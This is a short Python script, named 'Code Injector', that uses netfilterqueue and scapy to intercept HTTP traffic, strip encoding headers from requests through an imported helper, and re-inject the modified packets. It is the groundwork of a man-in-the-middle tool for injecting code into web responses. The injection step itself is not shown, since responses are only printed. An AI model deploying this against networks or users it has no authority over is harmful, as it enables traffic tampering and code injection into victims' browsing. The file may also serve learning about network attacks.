#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw
from Utilities.utils import set_load, remove_encode_request

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("\n[+] This is an HTTP Request:\n")
            print(scapy_packet.show())
            # remove encoding request is optional for if you actually detect an encoding request.
            scapy_packet = remove_encode_request(scapy_packet, set_load)
            packet.set_payload(str(scapy_packet))
            print(packet)
        elif scapy_packet[TCP].sport == 80:
            print("\n[+] This is a *** HTTP Response ***:\n")
            print(scapy_packet.show())
    packet.accept()
    return None

print("[+] Hello World, this is Code Injector!")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()